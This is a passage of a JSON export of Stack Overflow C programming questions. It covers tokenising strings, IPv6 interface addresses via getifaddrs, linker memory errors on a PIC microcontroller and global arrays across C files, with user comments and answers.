while(temp-&gt;next!=current)\n    {\n        temp=temp-&gt;next;\n        current=temp;\n    }\n    temp=head;\n\n    return current; \n}\n</code></pre>\n\n<p>I have linked list and 'head' pointer hold  first node , 'current' pointer hold  last node,I want to bring 'current' to head one by one ,so I write this function but it gives segmentation fault when I debug the program </p>\n"}, {"tags": ["c#", "c", "visual-studio-2015"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 1, "creation_date": 1444829759, "post_id": 33126831, "comment_id": 54065864, "body": "Give you a guide is a little bit complicated. BTW what you need is to make a wrapper dll. This wrapper must link the lib file."}, {"owner": {"reputation": 781, "user_id": 215779, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/d3bd6e8f48c598795c657ead05318a5d?s=128&d=identicon&r=PG&f=1", "display_name": "eddyq", "link": "https://stackoverflow.com/users/215779/eddyq"}, "reply_to_user": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1445277383, "post_id": 33126831, "comment_id": 54246073, "body": "Ok, thanks. I found out on another forum that I must do just that. I have made that change."}], "owner": {"reputation": 781, "user_id": 215779, "user_type": "registered", "accept_rate": 30, "profile_image": "https://www.gravatar.com/avatar/d3bd6e8f48c598795c657ead05318a5d?s=128&d=identicon&r=PG&f=1", "display_name": "eddyq", "link": "https://stackoverflow.com/users/215779/eddyq"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 68, "favorite_count": 0, "closed_date": 1444830894, "answer_count": 0, "score": 0, "last_activity_date": 1444829645, "creation_date": 1444829645, "question_id": 33126831, "link": "https://stackoverflow.com/questions/33126831/calling-c-code-from-c-where-the-c-code-is-in-a-lib", "closed_reason": "Duplicate", "title": "Calling C code from C# where the C code is in a .lib", "body": "<p>I have some C code that I want to call from C#. I have read several posts but they are all for .DLL's. My C code is in .LIB's. Is there a way?</p>\n\n<p>If so can you give a brief example?</p>\n\n<p>I am using Visual Studio 2015.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 79470, "user_id": 104790, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5f501c89b28ff1d1d81ba272aef89d59?s=128&d=identicon&r=PG", "display_name": "Nikolai Ruhe", "link": "https://stackoverflow.com/users/104790/nikolai-ruhe"}, "edited": false, "score": 5, "creation_date": 1444827543, "post_id": 33125943, "comment_id": 54064220, "body": "Do you have an actual question?"}, {"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 1, "creation_date": 1444827704, "post_id": 33125943, "comment_id": 54064328, "body": "Please use proper indentation in the future; it&#39;ll make your life much easier, and people much more likely to answer your questions. I&#39;ve fixed it for you this time. Also, this code doesn&#39;t compile."}, {"owner": {"reputation": 53, "user_id": 4415801, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/854bbad1b0fd0a5250045d197419e700?s=128&d=identicon&r=PG&f=1", "display_name": "hughdini", "link": "https://stackoverflow.com/users/4415801/hughdini"}, "edited": false, "score": 0, "creation_date": 1444827727, "post_id": 33125943, "comment_id": 54064347, "body": "Yes, my program wont work and I can&#39;t figure out why"}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 2, "creation_date": 1444828320, "post_id": 33125943, "comment_id": 54064795, "body": "&quot;Yes, my program wont work&quot; What is your program supposed to do? Please provide example input, the expected output and the actual output."}, {"owner": {"reputation": 53, "user_id": 4415801, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/854bbad1b0fd0a5250045d197419e700?s=128&d=identicon&r=PG&f=1", "display_name": "hughdini", "link": "https://stackoverflow.com/users/4415801/hughdini"}, "edited": false, "score": 0, "creation_date": 1444828675, "post_id": 33125943, "comment_id": 54065051, "body": "My program is supposed to read in a line such as &quot;hello world&quot; and return each word on a separate line such as: &quot;hello&quot; on one line and &quot;world&quot; on the next."}, {"owner": {"reputation": 26583, "user_id": 1441, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/fb7f1cd450084fdb4bfc9376c7dba2a7?s=128&d=identicon&r=PG", "display_name": "crashmstr", "link": "https://stackoverflow.com/users/1441/crashmstr"}, "edited": false, "score": 0, "creation_date": 1444828721, "post_id": 33125943, "comment_id": 54065082, "body": "If your code <i>does not compile</i>, you should specify the exact error messages you recieve from the compiler."}], "answers": [{"comments": [{"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1444827755, "post_id": 33125976, "comment_id": 54064365, "body": "That&#39;s hardly the biggest problem in this code, one cannot compare <code>char</code> and <code>const char*</code> using <code>==</code> or assign them using <code>=</code>."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1444827824, "post_id": 33125976, "comment_id": 54064412, "body": "@szczurcio  That&#39;s the point of it . he should compare with null character  . And it doesn&#39;t make any sense as OP&#39;s logic is broken ."}, {"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1444827884, "post_id": 33125976, "comment_id": 54064464, "body": "Ah yes, didn&#39;t notice the single quote, you&#39;re right."}], "tags": [], "owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "is_accepted": false, "score": 4, "last_activity_date": 1444829330, "last_edit_date": 1444829330, "creation_date": 1444827498, "answer_id": 33125976, "question_id": 33125943, "link": "https://stackoverflow.com/questions/33125943/tokenise-a-string-in-c-programming/33125976#33125976", "title": "Tokenise a String in C programming", "body": "<p>In your function <code>tokenise</code> -</p>\n\n<pre><code>if(str[start] == \"/o\"){\n</code></pre>\n\n<p>What is <code>\"/o\"</code> you compare with? It should be <code>'\\0'</code>. </p>\n\n<pre><code>if(str[start] == '\\0'){\n</code></pre>\n\n<p>And in <code>else</code> your function does not <code>return</code> anything , therefore , in that case UB.</p>\n\n<p>You function doesn't have any loop or use recursion to iterate over array ,therefore , your logic doesn't seem to achieve anything close .</p>\n"}, {"comments": [{"owner": {"reputation": 203344, "user_id": 140719, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/84a6aa25ee85e948123d97b672135526?s=128&d=identicon&r=PG", "display_name": "sbi", "link": "https://stackoverflow.com/users/140719/sbi"}, "edited": false, "score": 0, "creation_date": 1454081121, "post_id": 33126455, "comment_id": 57897874, "body": "<code>\\0</code> isn&#39;t EOF, but EOS."}], "tags": [], "owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "is_accepted": false, "score": 3, "last_activity_date": 1454082179, "last_edit_date": 1454082179, "creation_date": 1444828764, "answer_id": 33126455, "question_id": 33125943, "link": "https://stackoverflow.com/questions/33125943/tokenise-a-string-in-c-programming/33126455#33126455", "title": "Tokenise a String in C programming", "body": "<p>You have many problems with your code:</p>\n\n<pre><code>else {\n    result = str[start];\n}\n</code></pre>\n\n<p>No return value. That is undefined behaviour.</p>\n\n<pre><code>str[start] == '\\o'\n</code></pre>\n\n<p>Thats incorrect as you want to compare to the EOS null termination character\nDo this instead:</p>\n\n<pre><code>str[start] == '\\0'\n</code></pre>\n\n<p>Lastly, if you want your tokenise function to write into <code>result</code>, you need to pass a pointer to <code>result</code>, not the value of <code>result</code>.</p>\n\n<p>ps: semantic errors aside, your function does nothing resembling what you want. Look into loops and their implementation.</p>\n"}], "owner": {"reputation": 53, "user_id": 4415801, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/854bbad1b0fd0a5250045d197419e700?s=128&d=identicon&r=PG&f=1", "display_name": "hughdini", "link": "https://stackoverflow.com/users/4415801/hughdini"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 92, "favorite_count": 0, "closed_date": 1444836015, "answer_count": 2, "score": -8, "last_activity_date": 1454082179, "creation_date": 1444827400, "last_edit_date": 1444829009, "question_id": 33125943, "link": "https://stackoverflow.com/questions/33125943/tokenise-a-string-in-c-programming", "closed_reason": "Not suitable for this site", "title": "Tokenise a String in C programming", "body": "<p>I'm new to C programming and I know there have been other explanations on how to split a string into words but none of them seem similar to my program. I'm having difficulty finding the errors in my program:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt; \n\nint tokenise(char str[], int start, char result[]) {\n    if (str[start] == \"/o\") {\n        return -1;\n    } else {\n        result = str[start];\n    }\n}\n\n\nint main() {    \n    const int MAX_STRING = 256;\n    char buffer[MAX_STRING];\n    fgets(buffer, MAX_STRING, stdin);\n    char result[256];\n    int start;\n    start = tokenise(buffer, 0, result);\n\n    while ( start != -1 ) {\n        printf(\"%s\\n\", result);\n        start = tokenise(buffer, start, result);\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "sockets", "ipv6"], "comments": [{"owner": {"reputation": 4195, "user_id": 2432477, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a516bc16804edd78d8f6c2a7e06f07b?s=128&d=identicon&r=PG&f=1", "display_name": "nouney", "link": "https://stackoverflow.com/users/2432477/nouney"}, "edited": false, "score": 1, "creation_date": 1444828569, "post_id": 33125710, "comment_id": 54064966, "body": "<code>getifaddrs()</code> supports IPv6."}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 8, "last_activity_date": 1594910647, "last_edit_date": 1594910647, "creation_date": 1444830977, "answer_id": 33127330, "question_id": 33125710, "link": "https://stackoverflow.com/questions/33125710/how-to-get-ipv6-interface-address-using-getifaddr-function/33127330#33127330", "title": "how to get IPV6 interface address using getifaddr() function", "body": "<p><code>getifaddrs</code> does support IPv6.  Here's an example on how to print the name and IP address of all interfaces on the system:</p>\n<pre><code>struct ifaddrs *ifa, *ifa_tmp;\nchar addr[INET6_ADDRSTRLEN];\n\nif (getifaddrs(&amp;ifa) == -1) {\n    perror(&quot;getifaddrs failed&quot;);\n    exit(1);\n}\n\nifa_tmp = ifa;\nwhile (ifa_tmp) {\n    if ((ifa_tmp-&gt;ifa_addr) &amp;&amp; ((ifa_tmp-&gt;ifa_addr-&gt;sa_family == AF_INET) ||\n                              (ifa_tmp-&gt;ifa_addr-&gt;sa_family == AF_INET6))) {\n        if (ifa_tmp-&gt;ifa_addr-&gt;sa_family == AF_INET) {\n            // create IPv4 string\n            struct sockaddr_in *in = (struct sockaddr_in*) ifa_tmp-&gt;ifa_addr;\n            inet_ntop(AF_INET, &amp;in-&gt;sin_addr, addr, sizeof(addr));\n        } else { // AF_INET6\n            // create IPv6 string\n            struct sockaddr_in6 *in6 = (struct sockaddr_in6*) ifa_tmp-&gt;ifa_addr;\n            inet_ntop(AF_INET6, &amp;in6-&gt;sin6_addr, addr, sizeof(addr));\n        }\n        printf(&quot;name = %s\\n&quot;, ifa_tmp-&gt;ifa_name);\n        printf(&quot;addr = %s\\n&quot;, addr);\n    }\n    ifa_tmp = ifa_tmp-&gt;ifa_next;\n}\nfreeifaddrs(ifa);\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 5445154, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-Xz7onHMQ0ls/AAAAAAAAAAI/AAAAAAAAACg/5O2q1VHpfVo/photo.jpg?sz=128", "display_name": "pooja", "link": "https://stackoverflow.com/users/5445154/pooja"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 8916, "favorite_count": 1, "closed_date": 1444832394, "answer_count": 1, "score": 1, "last_activity_date": 1594910647, "creation_date": 1444826737, "last_edit_date": 1444831566, "question_id": 33125710, "link": "https://stackoverflow.com/questions/33125710/how-to-get-ipv6-interface-address-using-getifaddr-function", "closed_reason": "Duplicate", "title": "how to get IPV6 interface address using getifaddr() function", "body": "<p>I have <code>getifaddrs()</code> definition but it is for IPv4.  Please guide me how to get IPv6 if address using the <code>getifaddrs()</code> function.</p>\n"}, {"tags": ["android", "c", "linux", "android-ndk", "android-manifest"], "comments": [{"owner": {"reputation": 11138, "user_id": 1015327, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/00d71e011fc61cad60c5ffc9bf48c5ef?s=128&d=identicon&r=PG", "display_name": "JimmyB", "link": "https://stackoverflow.com/users/1015327/jimmyb"}, "edited": false, "score": 0, "creation_date": 1444826844, "post_id": 33125376, "comment_id": 54063753, "body": "Probably not via an API. But maybe look at this: <a href=\"http://www.olafdietsche.de/2015/05/11/exploring-android-binary-xml-file-format\" rel=\"nofollow noreferrer\">olafdietsche.de/2015/05/11/&hellip;</a>"}, {"owner": {"reputation": 51929, "user_id": 1524450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BSzDV.png?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/1524450/michael"}, "edited": false, "score": 1, "creation_date": 1444832248, "post_id": 33125376, "comment_id": 54067717, "body": "What would be the result of this &quot;parsing&quot;? Anything that isn&#39;t available in <a href=\"http://developer.android.com/reference/android/content/pm/PackageInfo.html\" rel=\"nofollow noreferrer\"><code>PackageInfo</code></a>?"}], "owner": {"reputation": 41, "user_id": 5436171, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e27f256123a450ca6af90cf33a5effd7?s=128&d=identicon&r=PG&f=1", "display_name": "maxschwa", "link": "https://stackoverflow.com/users/5436171/maxschwa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 35, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1444825851, "creation_date": 1444825851, "question_id": 33125376, "link": "https://stackoverflow.com/questions/33125376/parse-androidmanifest-with-only-ndk-without-use-the-java-layer", "title": "Parse AndroidManifest with only NDK without use the java layer", "body": "<p>is there a way to parse the AndroidManifest with only NDK without use the java layer?</p>\n\n<p>greets</p>\n"}, {"tags": ["c", "arrays", "struct", "static", "volatile"], "comments": [{"owner": {"reputation": 4113, "user_id": 2126582, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tVrzW.png?s=128&g=1", "display_name": "AnatolyS", "link": "https://stackoverflow.com/users/2126582/anatolys"}, "edited": false, "score": 2, "creation_date": 1444825888, "post_id": 33125296, "comment_id": 54063087, "body": "<a href=\"http://stackoverflow.com/questions/15391996/mplab-link-error-could-not-allocate-section-c30-compiler\" title=\"mplab link error could not allocate section c30 compiler\">stackoverflow.com/questions/15391996/&hellip;</a>"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1444827209, "post_id": 33125296, "comment_id": 54064000, "body": "Out of curiousity, what system is this? A bare metal microcontroller? Which one?"}, {"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 0, "creation_date": 1444828674, "post_id": 33125296, "comment_id": 54065048, "body": "The <code>volatile</code> makes no sense for your array. To make things proper declare your <code>struct</code> as a real type (without <code>volatile</code>), declare your one variable that is subject to unknown changes as volatile, and declare your array without <code>volatile</code>. And, why would you want your array to be <code>static</code>? Perhaps just a local variable in your function would suffice?"}, {"owner": {"reputation": 101, "user_id": 3693406, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/57aa111b2e008e1f2a5a4fe3e80ac9db?s=128&d=identicon&r=PG&f=1", "display_name": "user3693406", "link": "https://stackoverflow.com/users/3693406/user3693406"}, "edited": false, "score": 0, "creation_date": 1444935358, "post_id": 33125296, "comment_id": 54121542, "body": "This is a PIC microcontroller. Sorry, I&#39;m relatively new to C and probably don&#39;t completely understand how volatile works so I&#39;m looking into fixing that. I was basically just copying the way the first struct (which I did not write) was formatted because the whole point of this code is that whenever the module successfully connects to a network I need to add the details to a list of saved networks. If the module fails to connect to a network for more than 10 minutes, it spends 5 minutes attempting connection to each saved network before resetting."}], "answers": [{"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": true, "score": 3, "last_activity_date": 1444827001, "creation_date": 1444827001, "answer_id": 33125799, "question_id": 33125296, "link": "https://stackoverflow.com/questions/33125296/how-do-i-create-an-array-of-static-volatile-structs-in-c/33125799#33125799", "title": "How do I create an array of static volatile structs in C?", "body": "<blockquote>\n  <p>Link Error: Could not allocate section .nbss, size = 944 bytes</p>\n</blockquote>\n\n<p>The linker failed to allocate the memory needed for the array in the .bss section, which is where all uninitialized static storage duration variables go. You are using too much memory for statics/globals, simple as that.</p>\n\n<p>How to solve it depends on the specific system.</p>\n"}], "owner": {"reputation": 101, "user_id": 3693406, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/57aa111b2e008e1f2a5a4fe3e80ac9db?s=128&d=identicon&r=PG&f=1", "display_name": "user3693406", "link": "https://stackoverflow.com/users/3693406/user3693406"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 509, "favorite_count": 0, "accepted_answer_id": 33125799, "answer_count": 1, "score": 0, "last_activity_date": 1444827001, "creation_date": 1444825671, "question_id": 33125296, "link": "https://stackoverflow.com/questions/33125296/how-do-i-create-an-array-of-static-volatile-structs-in-c", "title": "How do I create an array of static volatile structs in C?", "body": "<p>As the title says, a project I've taken over has a static volatile struct that basically holds network data when connecting to a WiFi network. I need to create an array of these structs to save the data of previous networks. </p>\n\n<p>This is what the struct I'm trying to copy looks like:</p>\n\n<pre><code>static volatile struct\n{\n    BYTE        MySSID[32]; \n    BYTE        SsidLength;             \n    BYTE        SecurityMode;           \n    BYTE        SecurityKey[32];           \n    BYTE        SecurityKeyLength;\n    BYTE        dataValid;\n    BYTE        networkType;\n    BYTE        IsLinked;\n    BYTE        ConnectionID;\n} NetworkStruct;\n</code></pre>\n\n<p>And this is the most recent of my failed attempts at creating an array that I can copy the data in this struct to:</p>\n\n<pre><code>static volatile struct\n{\n    BYTE        MySSID[32]; \n    BYTE        SsidLength;             \n    BYTE        SecurityMode;           \n    BYTE        SecurityKey[32];           \n    BYTE        SecurityKeyLength;\n    BYTE        dataValid;\n    BYTE        networkType;\n    BYTE        IsLinked;\n    BYTE        ConnectionID;\n} SavedNetworks[10];\n</code></pre>\n\n<p>So far, this and every other attempt throws an error.</p>\n\n<p>Here is the error the above attempt throws:</p>\n\n<blockquote>\n  <p>Link Error: Could not allocate section .nbss, size = 944 bytes,\n  attributes = bss near<br>\n  Link Error: Could not allocate data memory</p>\n</blockquote>\n"}, {"tags": ["c", "arrays", "global"], "comments": [{"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 2, "creation_date": 1444825259, "post_id": 33125056, "comment_id": 54062658, "body": "In both cases you&#39;re breaking the &quot;one definition&quot; rule."}, {"owner": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "edited": false, "score": 2, "creation_date": 1444825470, "post_id": 33125056, "comment_id": 54062795, "body": "What Paul means is: use <code>extern</code> everywhere except in one and only one <code>.c</code> file, preferably the one where you declare <code>extern</code> in the corresponding <code>.h</code> file."}, {"owner": {"reputation": 137, "user_id": 4983155, "user_type": "registered", "accept_rate": 56, "profile_image": "https://lh6.googleusercontent.com/-Jn4zByOMdjc/AAAAAAAAAAI/AAAAAAAAB2Q/ra2ySY0yfHU/photo.jpg?sz=128", "display_name": "Ahmed F. Mostafa", "link": "https://stackoverflow.com/users/4983155/ahmed-f-mostafa"}, "edited": false, "score": 0, "creation_date": 1444825852, "post_id": 33125056, "comment_id": 54063062, "body": "yep you are right, it works fine now"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1444826625, "post_id": 33125056, "comment_id": 54063620, "body": "There&#39;s another design rule saying: never define anything in header files. No variables, no function definitions. If you do, you&#39;ll get all kinds of linker errors and oddities, plus it is poor program design. Also, to have one header file full of global variables is very bad design, as it creates a tight coupling between every single file in your project. As a rule of thumb, if you ever find yourself using the <code>extern</code> keyword for anything but constants, your program design is poor and needs to be re-made."}], "answers": [{"tags": [], "owner": {"reputation": 14704, "user_id": 908515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/f1L9v.png?s=128&g=1", "display_name": "undur_gongor", "link": "https://stackoverflow.com/users/908515/undur-gongor"}, "is_accepted": true, "score": 8, "last_activity_date": 1444826486, "last_edit_date": 1444826486, "creation_date": 1444825266, "answer_id": 33125148, "question_id": 33125056, "link": "https://stackoverflow.com/questions/33125056/global-array-in-16-bit-c/33125148#33125148", "title": "Global Array in 16 bit C", "body": "<p>In both cases you have definitions of an object <code>buffer</code> with external linkage in two translation units. </p>\n\n<p>This is not allowed in C (<a href=\"http://www.open-std.org/JTC1/SC22/wg14/www/docs/n1124.pdf\" rel=\"nofollow\">ISO/IEC 9899:1999</a>, \u00a76.9, 5):</p>\n\n<blockquote>\n  <p>If an identifier declared with external linkage is used in an\n  expression [...], somewhere in the entire program\n  there shall be exactly one external definition for the identifier [...]</p>\n</blockquote>\n\n<p>You are violating this \"shall\" requirement, hence your program has undefined behavior.</p>\n\n<p>Your compiler seems to create two distinct objects in this case. There is no guarantee, though.</p>\n\n<p>To fix this:</p>\n\n<ul>\n<li>put an <code>extern</code> declaration into the header</li>\n<li>and a definition (without <code>extern</code> and/or with initialisation) into either of the C files</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 5101, "user_id": 2672913, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/swwCb.png?s=128&g=1", "display_name": "Nick L.", "link": "https://stackoverflow.com/users/2672913/nick-l"}, "is_accepted": false, "score": 1, "last_activity_date": 1444851065, "last_edit_date": 1444851065, "creation_date": 1444825489, "answer_id": 33125221, "question_id": 33125056, "link": "https://stackoverflow.com/questions/33125056/global-array-in-16-bit-c/33125221#33125221", "title": "Global Array in 16 bit C", "body": "<p>Especially in case 2, it is obvious that you have the definition of 2 different arrays, with an external linkage to your .h file - no point in doing this, far from your intention.</p>\n\n<p>Now, in case 1, you are attempting an external linkage on 2 translation units, which will lead to undefined behavior, as <code>undur_gongor</code> already pointed out.</p>\n"}, {"comments": [{"owner": {"reputation": 4050, "user_id": 746346, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/bd7e28f3d04b09ab4a503a992568f417?s=128&d=identicon&r=PG", "display_name": "Tor Klingberg", "link": "https://stackoverflow.com/users/746346/tor-klingberg"}, "reply_to_user": {"reputation": 14704, "user_id": 908515, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/f1L9v.png?s=128&g=1", "display_name": "undur_gongor", "link": "https://stackoverflow.com/users/908515/undur-gongor"}, "edited": false, "score": 0, "creation_date": 1444826433, "post_id": 33125283, "comment_id": 54063493, "body": "Thanks, I must have been confusing it with functions there."}], "tags": [], "owner": {"reputation": 4050, "user_id": 746346, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/bd7e28f3d04b09ab4a503a992568f417?s=128&d=identicon&r=PG", "display_name": "Tor Klingberg", "link": "https://stackoverflow.com/users/746346/tor-klingberg"}, "is_accepted": false, "score": 1, "last_activity_date": 1444826416, "last_edit_date": 1444826416, "creation_date": 1444825638, "answer_id": 33125283, "question_id": 33125056, "link": "https://stackoverflow.com/questions/33125056/global-array-in-16-bit-c/33125283#33125283", "title": "Global Array in 16 bit C", "body": "<p>You want to define the array in one .c file:</p>\n\n<pre><code>char buffer[512];\n</code></pre>\n\n<p>Then declare it in the .h file:</p>\n\n<pre><code>extern char buffer[];\n</code></pre>\n"}], "owner": {"reputation": 137, "user_id": 4983155, "user_type": "registered", "accept_rate": 56, "profile_image": "https://lh6.googleusercontent.com/-Jn4zByOMdjc/AAAAAAAAAAI/AAAAAAAAB2Q/ra2ySY0yfHU/photo.jpg?sz=128", "display_name": "Ahmed F. Mostafa", "link": "https://stackoverflow.com/users/4983155/ahmed-f-mostafa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 118, "favorite_count": 0, "accepted_answer_id": 33125148, "answer_count": 3, "score": 3, "last_activity_date": 1444851065, "creation_date": 1444824985, "question_id": 33125056, "link": "https://stackoverflow.com/questions/33125056/global-array-in-16-bit-c", "title": "Global Array in 16 bit C", "body": "<p>i am trying to use global char array in my 16 bit kernel by using 2 ways as below :</p>\n\n<p>Way 1</p>\n\n<p>in globals.h</p>\n\n<pre><code>char buffer[512];\n</code></pre>\n\n<p>in kernel.c</p>\n\n<pre><code>#include \"globals.h\"\nextern char buffer[512];\n\nvoid func1\n{\nprintf(\"Address is %X\",&amp;buffer[0]);\n}\n</code></pre>\n\n<p>in module.c</p>\n\n<pre><code>#include \"globals.h\"\nextern char buffer[512];\n\nvoid func2\n{\nprintf(\"Address is %X\",&amp;buffer[0]);\n}\n</code></pre>\n\n<p>here i find both printed memory addresses is different!?</p>\n\n<p>Way 2</p>\n\n<p>in globals.h</p>\n\n<pre><code>extern char buffer[512];\n</code></pre>\n\n<p>in kernel.c</p>\n\n<pre><code>#include \"globals.h\"\nchar buffer[512];\n\nvoid func1\n{\nprintf(\"Address is %X\",&amp;buffer[0]);\n}\n</code></pre>\n\n<p>in module.c</p>\n\n<pre><code>#include \"globals.h\"\nchar buffer[512];\n\nvoid func2\n{\nprintf(\"Address is %X\",&amp;buffer[0]);\n}\n</code></pre>\n\n<p>here too i find both printed memory addresses is different!?</p>\n\n<p>i was expecting printing the same memory location as it is global array.</p>\n\n<p>can anybody explain this ?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 12144, "user_id": 72882, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/9d17e71eae127205da470fffa2dba899?s=128&d=identicon&r=PG", "display_name": "dandan78", "link": "https://stackoverflow.com/users/72882/dandan78"}, "edited": false, "score": 5, "creation_date": 1444824510, "post_id": 33124871, "comment_id": 54062140, "body": "what do you mean by &quot;fails&quot;?"}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 5, "creation_date": 1444824631, "post_id": 33124871, "comment_id": 54062220, "body": "<code>gap &#47;= 2.2;</code> ? Seriously ?"}, {"owner": {"reputation": 8574, "user_id": 798684, "user_type": "registered", "accept_rate": 92, "profile_image": 